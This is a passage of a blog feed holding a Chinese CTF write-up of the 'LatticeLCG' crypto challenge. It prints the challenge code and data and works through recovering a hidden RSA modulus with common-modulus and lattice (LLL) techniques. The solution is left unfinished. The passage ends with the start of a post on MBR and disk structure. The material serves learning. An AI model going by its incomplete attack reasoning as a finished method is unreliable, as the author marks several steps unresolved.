class="comment"># 生成LCG的相关线性参数:a、seed、b, 生成LCG的模数:n</span></span><br><span class="line">a = getPrime(<span class="number">512</span>)</span><br><span class="line">seed = getPrime(<span class="number">512</span>)</span><br><span class="line">b = bytes_to_long(flag)</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一部分对参数a进行破解,实际上是RSA的共模攻击,但是这个共模攻击没有给n</span></span><br><span class="line">e1 = <span class="number">2333</span></span><br><span class="line">e2 = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(a,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(a,e2,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二部分就是生成连续的10个LCG结果</span></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 = &quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 = &quot;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output1 = &quot;</span>,output[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output2 = &quot;</span>,output[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三部分就是用于求解n的</span></span><br><span class="line">e = [getPrime(<span class="number">128</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">out = []</span><br><span class="line">m = getPrime(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">    out.append(<span class="built_in">pow</span>(m,i,n))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;out=&quot;</span>,out)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c1 =  132894829064255831243210470637067717685821770359549730768366345840525257033166172926149293454192143005551270166547902269036843756318967855047301751521125394803373953151753927497701242767032542708689455184991906629946511295108898559666019232955132938245031352553261823905498810285940911315433144300083027795647</span></span><br><span class="line"><span class="string">c2 =  24086830909813702968855830967174364278115647345064163689290457852025690324300607354444884288995399344650789235347773145941872226843099538451759854505842021844881825309790171852845467221751852440178862638893185965125776165397575087879479327323737686652198357863042305078811580074617322063509435591981140533310</span></span><br><span class="line"><span class="string">output1 =  54997286032365904331111467760366122947903752273328087460831713533712307510311367648330090376100815622160705007873798883153287827481112070182047111994066594911019010222064952859306742931009422376955635523160546531204043294436812066746785938062292942759004837173423765427628610568097898331237064396308950601636</span></span><br><span class="line"><span class="string">output2 =  115015764780168428067411132384122324817310808727138440691727747976276050930701648349452842302609389394467134068064132550313721128807222231505312226682756817617177620169804112319332815872107656884931985435898097063491690413460967856530075292289784649593915313885813931026280791070577034075346669028068003251024</span></span><br><span class="line"><span class="string">e= [297332330847212015073434001239859795661, 247136911662054641479463124065475615181, 269964458627145370722389742095701827701, 270745917671094194052444327351021588037, 254010082507930275771798119457499420531, 219178601856077385518322602059961601013, 226562702503988968288128483964146379529, 236756812424464516919183114495913408541, 330800121752029915693039296018980956519, 244800084005240595691424199440981715431, 171753849214889522920105847094773384191, 175843874533972361422410968920873382741, 326554577162848075059517044795930784993, 181842368629269753698222635712342485771, 221634122983362091660188171985742369561, 314244561819808202322467576330355199409, 286703236198397527318161582654787197007, 298101543059628501506668748374542117409, 304158884506393754601331945634109778837, 227577031261920314010408499530794497453]</span></span><br><span class="line"><span class="string">out= [100163998802948218573427220530909801629443946118807841130458771881611961921044413091457977957530737347507311468578174294420439883266450142918647561103714976340598499984679873518770686239019753272419975426555435266764099822607336645955391865380657632176223122712125661464370522088500110746571354290680063421912, 123528268396018633078964378145622645321836134964966941909300627704018826667414656614011250938241127521627117348901416042868382174504514240509791471909819407751786633761392047187057200130450960708049681366686147337178110669163142189940397343388837018627392202704211693014162963133958078984558400205296509955066, 50364974727218716170137342348825758682286710377257708196467656986986475658591351848251278364177715325447140300281348027787487944839878770556527568407280736570303345044999352851718908253510696083227344179177110348363623815158409862985684687329665113210373028159714648637297476014803935686233984711925346269925, 9159042298258514259206302054907530984498816597282237786310355131965025367180505822032135021520906576471052417629425493533222088036674196397387325202128095476044308794426593565419139845832998557280786358482011226957053125314152322427131984411160984485669030286331376124575677908877399942011661647598763754231, 83466948172962290899792524342204996697711370224947233607865306692546824512672969402433314856742908546253967225963904395036102408684746619744412073888614033881366518452878344698289278946024167788789718690655953517892282374396760436658422838909903123439370164929347147855359470889455753772857233516742991766128, 72028057477369331020972407277180913909557985390590548305094935208898254733240351763155769013959589016793318772858662702447133499307826143247356049051993727167694036585280387890126287679890730586145740176250715386149857291210207281073772478229355625725300592003798974298248102432508449566953296818450441875311, 63397152736399466888877444377156185012692670493456346196278062009641363047685720620967313379507212944658351683022480839941265221126018392433078546696140135677499181555082643172378488800458657825640013090182171355299282023794908520172571785687147143015581400891531296496177973817400317905868361800342940667657, 45427004823510815929685208038284324980662968275105063862891077759131069014314933978878667052450145039482242546093735499108826130367476890384431317243013990394189191560941678120985717370542332803012619694821129395559214706968432476548145608291516176910849698455496733056096163035964057523545705356926187216133, 85046100612081858546755294340770681541320509587396377967875404950325314121709046137842413744740490231945105758075761946555179595664901813127463402854440384657046429776033129391138370272524736543471909307910018577738207910417672603889922445435939876023878220177983424547612635006926243055642166274730894301704, 5833380233103086014860892228744764647016585478949686583145531659689295506666493518453642500086277427538189091865461553097914845680665917702500908205558454036911757659426809969367680394533585635383007758339917554453268182491874683638880986360065633842854622244953985055815937671635222264056071882344388307409, 83587615309194701727032548415548847571046191382552371312058083137102227325098839286526833147951063338204327145093831238962818333112251936853329663907079943414231588222256242520221314528944937229985997926851198158564313703719031124442094987245466116488897263358510493905440842917634723859176839440753120904481, 108651960334634726889543063749359050688114025706494125848785084643330096858725917513596985853593252388835207675036982640195609499739937405655156895161071906340785173459426867946058638393154997931747445494284445204735492709747637173698383609764016673932827648159152658645291248613736662020472251048171789274368, 118612010487916657134965416492319303083994743753602531817008130269546146141506819718265549648441671373744766173780682168587021797626910931105508317440664521595783406848956221465897709761805869130021172013000282497881581247777388315282629463546261696169893882772397797722134711444928443061384985458691749569847, 106808406616890955924408992591724627593882118490933791849624747503316110669154243209826761617940864170830792705070618439466645580274835929100331418955890808763286193770831205511071440703609240364726061677822134370309018443508205980554831705850988319397384130044484586798585896460152167042282847992593429629533, 88091869606421350393441194783722851111189272445506506936925797213395319937783082680078622732926273935980894566775394134783157488360516905477700601820480975112122167589887641130656305741351643175495552454293030309247254533571254198691204714097846510872592569447050033289483493274672346210063885124570695832880, 94400859500860667431780782962782396345261822402898708716634581228428633704975879685572548692997007974004673676539496590659276952154740096463133011458100387006276325192223993452314873089466451613079029429327880672384210802191677586975844471189127835578979108767548290181668434770385199468588493042256788539610, 76177813724283720012398394789596589415486093955132688784865364048503447246391866424200071522136707581280434193680972230914105236504028522288780213089260160776489804587209115330412067560802680789338779056583047491942817016437672075192528508677997165703606520158178725128251694801612417667440677124932361973397, 17188209523466762369281362386525396145127294763502094183797065621821932913685690176344514910405677170931795652509426794846131051983826422536084073462084935517166603832542862106287058675490933197600813710203114108790043880150305327523679949543592622443904084453387396870899883324751789625806819506542619123964, 120007173989070249117019147454557020213723707722383599019972471016186584968096445904023372671513462965078400715365736756710078805039115601609874780421117795585342458478316236202328120583456334489780231976628584606042971207759763658961365139429661536955996519512283283500790612975034779837647053750631763512799, 18797057418663411295612229938999282286746920748194349166509084258061650142260043277698907538088835210620841171754186980908772147495732980563542600139935202965632319542217264685208215907551992891370166006725534397313373079841419662622936316343820775075897977228084528246337988431658221881343556854053475137330]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>通过分析上面的代码我们其实可以得到最终目标是通过LCG泄露出来连续的2个数据恢复出参数<code>b</code>，参数<code>b</code>其实就是flag。<ul><li>如果要恢复b的话，我们其实需要恢复<code>a</code>、<code>n</code></li><li>如果我们需要恢复<code>a</code>的话我们就先要恢复<code>n</code></li><li>所以本题的分析顺序应该是先恢复<code>n</code>，再恢复<code>a</code>，最后再恢复<code>b</code></li></ul></li></ul><h3 id="latticelcg第一部分"><a href="#LatticeLCG第一部分" class="headerlink" title="LatticeLCG第一部分"></a>LatticeLCG第一部分</h3><ul><li><p>QAQ这部分不会，想了很久，但是没有动手写攻击代码去仔细研究（鸡块师傅把思考过程给写出来了确实太棒了）</p></li><li><p>该部分我们要先来恢复<code>n</code>，对于恢复<code>n</code>来说，我们要利用这段代码对n进行恢复。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e = [getPrime(<span class="number">128</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">out = []</span><br><span class="line">m = getPrime(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">    out.append(<span class="built_in">pow</span>(m,i,n))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;out=&quot;</span>,out)</span><br></pre></td></tr></table></figure><ul><li>对于<code>out</code>和<code>e</code>有如下的关系式子（多列几个）：</li></ul><script type="math/tex; mode=display">out_1\equiv m^{e_1}~mod(~n)\\out_2\equiv m^{e_2}~mod(~n)\\out_3\equiv m^{e_3}~mod(~n)\\out_4\equiv m^{e_4}~mod(~n)\\...\\out_{20}\equiv m^{e_{20}}~mod(~n)</script><ul><li>对于这个式子的分析有以下两种说法：<ul><li>第一种说法就是某个米奇妙妙的共模攻击方式， 共模攻击中模数需要已知，但是该问题显然是模数未知的情况。</li><li>第二种说法就是根据题目的提示是某个格攻击，但是如何造格需要我们自己去探究一下。</li></ul></li><li><p>首先看到这种结构肯定都是往共模攻击去探索，下面就是一个探索的过程，我们就取前三个式子来研究，这边$e<em>1,…,e</em>{20}$是两两互素的，满足共模攻击的条件：</p><script type="math/tex; mode=display">out_1\equiv m^{e_1}~mod(~n)\\out_2\equiv m^{e_2}~mod(~n)\\out_3\equiv m^{e_3}~mod(~n)\\</script><ul><li>对于第一个式子和第二个式子，通过共模攻击其实就有：</li></ul><script type="math/tex; mode=display">out_1^{s_1}*out_2^{t_1}\equiv m^{s_1e_1+t_1e_2}\equiv m ~mod(~n)</script><ul><li>对于第二个式子和第三个式子，通过共模攻击其实就有：</li></ul><script type="math/tex; mode=display">out_2^{s_2}*out_3^{t_2}\equiv m^{s_2e_2+t_2e_3}\equiv m ~mod(~n)</script><ul><li>那么将这两个共模攻击所得到的新式子相减，那么就有如下的式子：</li></ul><script type="math/tex; mode=display">\begin{array}{l}out_1^{s_1}*out_2^{t_1}-out_2^{s_2}*out_3^{t_2}\equiv0~mod(~n)\\\Rightarrow n|out_1^{s_1}*out_2^{t_1}-out_2^{s_2}*out_3^{t_2}\end{array}</script><ul><li>同理再使用一组$out_2、out_3、out_4$，就会有如下的一个式子：</li></ul><script type="math/tex; mode=display">\begin{array}{l}out_2^{s_3}*out_3^{t_3}-out_3^{s_4}*out_4^{t_4}\equiv0~mod(~n)\\\Rightarrow n|out_2^{s_3}*out_3^{t_3}-out_3^{s_4}*out_4^{t_4}\end{array}</script><ul><li>那么$gcd(out_1^{s_1}<em>out_2^{t_1}-out_2^{s_2}</em>out_3^{t_2},out_2^{s_3}<em>out_3^{t_3}-out_3^{s_4}</em>out_4^{t_4})=kn$，并且$k$是比较小的。</li></ul></li><li><p>从上面可以得到一个思路，思路有了那就赶紧实践起来。但是在实践的过程中会出现一个问题，由于$n$未知，我们无法使用模幂运算，只能单纯的进行幂运算，这样就会导致运算量很大，不能在有限的时间内计算出来幂运算的结果。如下图所示：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = gmpy2.gcdext(e[0],e[1])</span><br><span class="line">print(x)</span><br><span class="line">x1 = x[1]</span><br><span class="line">out_1 = pow(out[0],int(x1))</span><br></pre></td></tr></table></figure><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251221012654192.png" alt="image-20251221012654192"></p><ul><li>但是在尝试的过程中，我们发现了共模攻击指数上的运算其实是裴蜀定理，而这个裴蜀定理实际上就是解二元一次整数方程。对于上面的方程组有：</li></ul><script type="math/tex; mode=display">\begin{array}{l}e_1x_1+e_2x_2=1\Rightarrow \begin{bmatrix}e_1&e_2\end{bmatrix}\begin{bmatrix}x_1\\x_2\end{bmatrix}=\begin{bmatrix}1\end{bmatrix}\\e_2x_3+e_3x_4=1\Rightarrow\begin{bmatrix}e_2&e_3\end{bmatrix}\begin{bmatrix}x_2\\x_3\end{bmatrix}=\begin{bmatrix}1\end{bmatrix}\end{array}</script><ul><li>并且其实不难想到（初学者很难想到）格基规约最终得到的结果是尽量短、尽量正交的两个向量，那么这个就很可能比<code>gcdext()</code>求得的值小很多，接下来就是探究造格的过程。对于造格以及对所造的格进行LLL算法，我有以下疑问（如果想通这两点，那么之后对格密码的学习可能速度就会变得起飞）：</li></ul><blockquote><ol><li>怎么造格，如果构造一个矩阵或者说如何寻找一个格基确定这个格。</li><li>为什么所造的格使用LLL算法规约后得到的最短向量（或者近似最短向量）就是该方程的解，如何证明它。</li></ol></blockquote><ul><li>这边就先给出一个正确的造格（先从结果论），下面这个式子从矩阵乘法来说是没错的。但是我们是使用规约求最短向量，而不是去求解这个方程。但是这个规约出来是这样的。（剩下部分思路有点卡住了，要等后续再来看看了，目前来说一些造格的敏感度是有了，但是为什么能造出这个格，为什么能规约出来还是不太明白，2025年12月21日留）</li></ul><script type="math/tex; mode=display">\begin{bmatrix}x_1&x_2\end{bmatrix}\begin{bmatrix}e_1&1&0\\e_2&0&1\end{bmatrix}=\begin{bmatrix}e_1x_1+e_2x_2&x_1&x_2\end{bmatrix}</script><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251221144418957.png" alt="image-20251221144418957"></p><ul><li>接下来我们来从两种角度来理解这个格构成的矩阵，第一个视角就是从列向量的角度去理解这个格。目前我对这个列向量组视角理解的格是这样的（这种理解角度不一定对，我也是初学者QAQ）：<ul><li>列向量$\beta_1$是约束条件，使得规约的时候能规约的符合条件的最短向量。</li><li>列向量$\beta_2、\beta_3$其实能组合成一个单位正交向量，这两个向量的作用是，规约后的2个行向量中第一个元素如果能规约出来<code>1</code>，那么这个行向量的第二、第三个元素其实就是我们要求解的最短向量之一，这样就可以解出答案。</li><li><strong>总结</strong>：这样造格，从列向量角度来说其实就是一个关键点<strong>约束</strong></li></ul></li></ul><script type="math/tex; mode=display">\beta_1 = \begin{bmatrix}e_1\\e_2\end{bmatrix},\beta_2 = \begin{bmatrix}1\\0\end{bmatrix},\beta_3 = \begin{bmatrix}0\\1\end{bmatrix}</script><ul><li>接下来看看从行向量的角度上来看，其实就是两个具有三个分量的向量，那其实就是在（把向量空间用几何空间来理解）几何空间的一个平面上，如下图所示，这里以$e_1=33，e_2=24$为例子：</li></ul><script type="math/tex; mode=display">\alpha_1 = \begin{bmatrix}e_1&1&0\end{bmatrix}\\\alpha_2 = \begin{bmatrix}e_1&0&1\end{bmatrix}</script><blockquote><ol><li>这个向量构成的格在几何空间中其实就是一个平面上离散有规律的点（仅仅就是在一个平面上离散有规律的点，紫色的那条线是$33x+24y-1=0$这个二维平面$xoy$中的直线，在三维空间$xoyoz$中平移到这个地方的样子）。<ul><li>如果我们用列向量组的视角看格点，我们会把其放入到平面空间中去研究（但是二维平面两个向量就足够了，所以怎么想都想不通LLL应该如何规约他）。</li><li>但是如果是从行向量组的视角看这个我们就会把格放在三维的几何空间中的某个平面去研究，这就很快能想到格点位于三维空间中的某个二维平面，并且规约的时候是正常规约的。</li></ul></li></ol><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222005123217.png" alt="image-20251222005123217"><br><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222010146644.png" alt="image-20251222010146644"></p><ol><li>接下来看看规约后的向量<ul><li>可以很直观的看出来规约后生成整个三维空间都比较方正的。</li><li>并且规约后得到的两个向量也是正交向量</li></ul></li></ol><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222010240095.png" alt="image-20251222010240095"></p><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222010359193.png" alt="image-20251222010359193"><br><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222010413033.png" alt="image-20251222010413033"></p></blockquote><ul><li>现在回到本题，通过造格后进行规约操作，发现第一个元素规约不出来是<code>1</code>，那么可能就猜想格的维数太小了，规约不准确。</li></ul><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222011217147.png" alt="image-20251222011217147"></p><ul><li>因为裴蜀定理n个元也是成立的，那么共模攻击$e<em>1,…,e</em>{20}$互素，其实就有一定存在这个式子，那就可以由此造一个<code>20×21</code>的格</li></ul><script type="math/tex; mode=display">s_1e_1+...+s_{20}e_{20}=1</script><script type="math/tex; mode=display">\begin{bmatrix}s_1&...&s_{20}\end{bmatrix}_{1×20}\begin{bmatrix}e_1&1&0&\dots&0\\e_2&0&1&\dots&0\\\vdots&\vdots&\vdots&\ddots&0\\e_{19}&0&0&\dots&0\\e_{20}&0&0&\dots&1\end{bmatrix}_{20×21}=\begin{bmatrix}1&s_1&...&s_{20}\end{bmatrix}_{1×21}</script><ul><li>但是这个有一个疑问，规约出来的矩阵是$20×21$，而不是$1×21$。其实是这样的规约出来的矩阵，以行向量组的形式看，规约出来的<code>20</code>个行向量中，每一个行向量都有可能是我正确的结果。</li></ul><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222013123175.png" alt="image-20251222013123175"></p><ul><li>但是如何判断那一行到底是才是真正的我们想要结果的，这个就要从我们约束的式子来看，我们造格约束的每个行向量的第一个元素应该需要是<code>1</code>，而规约后的矩阵看结果都不是<code>1</code>，蛋糕了。</li></ul><blockquote><p>注意：这里以我目前的理解是只要第一列某行元素是1，那么行的元素就是我们要得到的答案。而鸡块师傅的理解是<strong>短向量的第一列相同</strong></p></blockquote><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222013802966.png" alt="image-20251222013802966"></p><ul><li>这时就需要配平一下了，配平这里简单讲一下作用：<code>让“正确解对应的向量在几何上变短”</code>，剩下的后面体会。这里就给格配个平，规约出来后就像下图这样：</li></ul><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251222020254027.png" alt="image-20251222020254027"></p><ul><li>之后取两行就行了，然后再用共模攻击的方式求出，但是这里还要注意一点就是，在模下的负数幂是在分数上的。但是其实我们先</li></ul><script type="math/tex; mode=display">out_1^{s_1}*out_2^{s_2}...out_{20}^{s_{20}}-out</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="latticelcg第二部分"><a href="#LatticeLCG第二部分" class="headerlink" title="LatticeLCG第二部分"></a>LatticeLCG第二部分</h3><h3 id="体会"><a href="#体会" class="headerlink" title="体会"></a>体会</h3><blockquote><p>通过LatticeLCG这题，对格攻击的认识有了进一步了解，先写下我的这几个理解：</p><ol><li>需要使用格攻击的题目，都要去寻找题目中的线性关系或者具有线性空间的代数结构。有时候用到数学的转化与化归的思想，构造出一些米奇妙妙小结构，这个结构一般都是满足线性关系或者是线性空间，或者把式子约束线性空间中去研究。而学到的具有线性空间的代数结构有：<code>线性方程组</code>、<code>矩阵</code>、<code>多项式</code>、<code>向量空间</code>等。接下来我们举一个例子（例子不一定准确）：<ul><li>本题中指数是没有线性关系的，但是我们通过共模攻击的思路可以得到一个线性方程（虽然不是线性空间，但是出现了线性关系！）。</li></ul></li><li><p>对于找到关键线性关系的式子后，我们想的并不是解方程（组），而是找到一个小整数解。找到之后才能干别的事情</p></li><li><p>通过上面的题目，以及平时接触到的一些造格思路，都是类似于下面这样的，未知量放在左边，格放在又右边，将它们进行乘法运算。其中有如下规律（从结果上看，采用列向量组的形式表示格向量），对于造格我们一般需要构造的是$n×(n+1)$矩阵，也就是有$(n+1)$个列向量：</p><ul><li>第1个列向量总是取所找到的线性关系的参数，用于约束规约的结果。</li><li>第2个到第n+1个列向量总是单位正交向量（可能不是单位向量，但是一般都是正交向量），这样如果能在$a_{i1}$中规约出正确的结果方程结果，那么该行的剩下元素很可能就是符合该约束方程的其中一个解集。</li></ul></li></ol></blockquote><h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="newbottleoldwine"><a href="#NewBottleOldWine" class="headerlink" title="NewBottleOldWine"></a>NewBottleOldWine</h2><h2 id="xenny的诱惑"><a href="#xenny的诱惑" class="headerlink" title="xenny的诱惑"></a>xenny的诱惑</h2><p>​</p>]]></content>
    
    
    <summary type="html">前言：直接跟着鸡块师傅的博客刷题吧。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>UEFI-编程开发C语言2-磁盘分区与文件系统</title>
    <link href="http://iyheart.github.io/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/"/>
    <id>http://iyheart.github.io/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/</id>
    <published>2025-12-08T08:49:56.000Z</published>
    <updated>2025-12-21T04:42:03.630Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.cnblogs.com/cyx-b/p/14091603.html">硬盘分区表知识——详解硬盘MBR - chuyaoxin - 博客园</a></li><li>参考视频：</li><li><p>操作系统只稍微讲到文件系统，以及磁盘的扇区、柱面，好像也有讲稍微有讲到<code>LVM逻辑卷管理</code>，但是对磁盘整个格式的理解没有串下来，导致当时美亚的时候RAID搞不出来。</p></li><li><p>磁盘这边就讨论的是单个磁盘，不考虑RAID的情况，RAID的情况之后再说。（有一说一会RAID手动恢复还挺赚钱的？一个单子至少都是几百，一般都是千元往上？但是不知道现在行情怎么样）</p></li><li><p>先给一个图，看看磁盘的总体结构，对磁盘中的一些结构有个总体把握。首先介绍一下比较早期的磁盘中的数据结构格式（这个早期的磁盘结构格式其实就是指的<code>GPT</code>磁盘分区表出来之前，用的还是<code>MBR</code>引导分区），对于<code>MBR</code>和<code>GPT</code>目前就先知道这两个名词先。其他的无需过多关注。</p></li></ul><h1 id="总体图片"><a href="#总体图片" class="headerlink" title="总体图片"></a>总体图片</h1><ul><li>对于目前先全面理解一下<code>一个硬盘</code>，目前先不考虑<code>UEFI</code>这个程序到底放在哪里（总之不是放在磁盘中，而是放在主板的ROM上）</li><li>先来回顾一下操作系统的内容，计算机在按下电源键的开机时，执行流程如下：<ul><li>按下电源键开机时，先执行主板<code>bios</code>程序，进行完一系列的检测和配置以后。开始按照<code>bios</code>设定的系统引导顺序引导系统。</li><li>假设现在是从磁盘中引导系统，<code>bios</code>就会将控制权交给硬盘去执行硬盘中的一段二进制程序。那么这个二进制程序是在哪里存放的，这就引出了<code>MBR</code>(master boot record)中文名为<code>主引导记录区</code>。（注意并不是直接转到磁盘中执行，而是先将<code>MBR</code>载入到内存地址起始位置为<code>0x7C00</code>后，<code>bios</code>有段汇编是<code>jmp 0x7C00</code>，最终执行<code>MBR</code>那一段代码。）</li><li>之后就会加载操作系统的引导程序（该程序在本篇文章中不做介绍），执行该程序之后就会加载<code>内核、驱动、UI</code>等程序</li></ul></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251208222836885.png" alt="image-20251208222836885"></p><h2 id="mbr型"><a href="#MBR型" class="headerlink" title="MBR型"></a>MBR型</h2><h3 id="mbr大致结构图1"><a href="#MBR大致结构图1" class="headerlink" title="MBR大致结构图1"></a>MBR大致结构图1</h3><p>下面这张图就表示了<code>MBR</code>型的主要大致结构，这里大致介绍一下，主引导记录<code>MBR</code>。图中有三个要点需要注意的：</p><ul><li><code>MBR</code>引导代码其实就是<code>BIOS</code>自检完要将控制权交给磁盘后，磁盘要执行的代码，其实就是<code>MBR引导代码</code>。</li><li><code>MBR</code>分区表，主要就是用来标识下面的四个主分区，并且<code>MBR</code>分区表最多只能标识<code>四个主分区</code>（因为设计比较早所以没有考虑太长远。）</li><li>之后就是标识着<code>MBR</code>结尾的标识符，类似与PE文件头，这个其实算是<code>MBR</code>文件尾。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251208223424364.png" alt="image-20251208223424364"></p><ul><li>对于MBR分区表这里再给出一个图片，该图片其实表名了MBR分区表可能起到索引作用。由于一开始设计<code>MBR主引导记录</code>，固定了其大小为<code>512</code>字节，所以<code>MBR</code>分区只能分出四个主分区表项。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251208224444440.png" alt="image-20251208224444440"></p><h3 id="mbr大致结构图2"><a href="#MBR大致结构图2" class="headerlink" title="MBR大致结构图2"></a>MBR大致结构图2</h3><ul><li>主引导记录的大致结构已经看完了，接下来看看每个主分区的结构。对于每个主分区的结构都会有一个引导扇区，该引导扇区被称做<code>DBR</code>，英文全称为<code>Dos / Volume Boot Record</code>，有的时候也被称为<code>VBR</code>。</li><li>目前先有个了解，对于<code>DBR</code>的具体结构后面会具体介绍。</li></ul><blockquote><p>注意：DBR其实是和文件系统在一个层面的，只是这里为了方便循序渐进的理解，将DBR与文件系统分离了。在大致结构图3中会贴出一个图片。</p></blockquote><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251208230136404.png" alt="image-20251208230136404"></p><h3 id="mbr大致结构图3"><a href="#MBR大致结构图3" class="headerlink" title="MBR大致结构图3"></a>MBR大致结构图3</h3><ul><li>对于每个主分区中数据这块还需要花费一块空间存储文件系统的一些结构和数据，这个该分区的剩余部分才是真正存放文件的地方。</li><li>这里我就以<code>FAT</code>系列的文件系统为例子，画出下图中<code>主分区2</code>的引导程序，这个图才是真正的一块能存储文件的硬盘的主要格式。</li></ul><blockquote><ul><li><p>注意：<strong>之前画的下面两张图FAT文件系统部分有错误，已于2025年12月12日进行更改，更改为一张图</strong></p></li><li><p>注意：<strong>表示文件系统和DBR其实是在同一个层面，而并非<code>MBR</code>与<code>DBR</code>在同一个层面</strong></p></li></ul></blockquote><p><img 